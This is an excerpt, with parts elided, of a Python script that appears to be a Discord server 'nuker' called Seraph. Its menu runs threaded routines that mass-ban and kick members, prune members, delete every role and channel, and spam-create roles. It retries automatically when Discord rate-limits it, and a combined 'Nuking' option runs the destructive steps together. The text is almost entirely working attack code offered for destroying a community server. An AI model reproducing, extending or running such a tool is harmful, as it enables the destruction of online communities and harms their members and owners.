    ...
    def Ban(guild, member):
        try:
            ...
            if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                ...
                sleeptime = int(retry_after)
                print(f"\x1b[38;5;213m[\033[37m!\x1b[38;5;213m]\033[37m Ratelimited, Sleeping for \x1b[38;5;213m{sleeptime} \033[37mSeconds")
                time.sleep(sleeptime)
                Seraph.Ban(guild, member)
            else:
    ...
    def DelChannel(guild, channel):
        try:
            ...
            if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                ...
                print(f"\x1b[38;5;213m[\033[37m!\x1b[38;5;213m]\033[37m Ratelimited, Sleeping for \x1b[38;5;213m{sleeptime} \033[37mSeconds")
                time.sleep(sleeptime)
                Seraph.DelChannel(guild, channel)
            else:
...
async def menu():
    ...
    if choice == "1":
        ...
        if guildID == '':
            print("\033[91m>\033[39m Enter a Guild ID")
            time.sleep(1)
            await menu()
        ...
        while True:
            try:
                ban1 = functools.partial(Seraph.Ban, guild.id, members_1[num])
                ban2 = functools.partial(Seraph.Ban, guild.id, members_2[num])
                ban3 = functools.partial(Seraph.Ban, guild.id, members_3[num])

                Thread(target=ban1).start()
                Thread(target=ban2).start()
                Thread(target=ban3).start()
                num += 1
            except IndexError:
                break
            except:
    ...
    if choice == "2":
        ...
        print(f'\n\x1b[38;5;213m[\033[37m!\x1b[38;5;213m]\033[37m Kicking Members..')
        ...
        while True:
            try:
                kick1 = functools.partial(Seraph.Kick, guild.id, members_11[num2])
                kick2 = functools.partial(Seraph.Kick, guild.id, members_22[num2])
                kick3 = functools.partial(Seraph.Kick, guild.id, members_33[num2])

                Thread(target=kick1).start()
                Thread(target=kick2).start()
                Thread(target=kick3).start()
                num2 += 1
            except IndexError:
                break
            except:
    ...
    if choice == "3":
        ...
        try:
            ...
            time.sleep(1)
            await menu()
        print(f'\n\x1b[38;5;213m[\033[37m!\x1b[38;5;213m]\033[37m Pruning Members..')
    ...
    if choice == "4":
        ...
        print(f'\n\x1b[38;5;213m[\033[37m!\x1b[38;5;213m]\033[37m Deleting Roles..')
        ...
        while True:
            try:
                delrole = functools.partial(Seraph.DelRole, guild.id, roles[rnum])

                Thread(target=delrole).start()
                rnum += 1
            except IndexError:
                break
            except:
    ...
    if choice == "5":
        ...
        print(f'\n\x1b[38;5;213m[\033[37m!\x1b[38;5;213m]\033[37m Deleting Channels..')
        ...
        while True:
            try:
                delchan = functools.partial(Seraph.DelChannel, guild.id, channels[cnum])

                Thread(target=delchan).start()
                cnum += 1
            except IndexError:
                break
            except:
    ...
    if choice == "6":
        ...
        if guildID == '':
            ...
            print("\033[91m>\033[39m Enter a Role Amount")
            time.sleep(1)
            await menu()

        elif channel_amount == '':
            print("\033[91m>\033[39m Enter a Channel Amount")
            time.sleep(1)
            await menu()
        ...
        print(f'\n\x1b[38;5;213m[\033[37m!\x1b[38;5;213m]\033[37m Nuking..')
        ...
        while True:
            try:
                ban1 = functools.partial(Seraph.Ban, guild.id, members_111[num3])
                ban2 = functools.partial(Seraph.Ban, guild.id, members_222[num3])
                ban3 = functools.partial(Seraph.Ban, guild.id, members_333[num3])
        ...
        for i in range(role_amount):
            createrole = functools.partial(Seraph.CreateRole, guild.id)

            Thread(target=createrole).start()
    ...
    if choice == "7":
        ...
        print(f'\n\x1b[38;5;213m[\033[37m!\x1b[38;5;213m]\033[37m Creating Roles..')
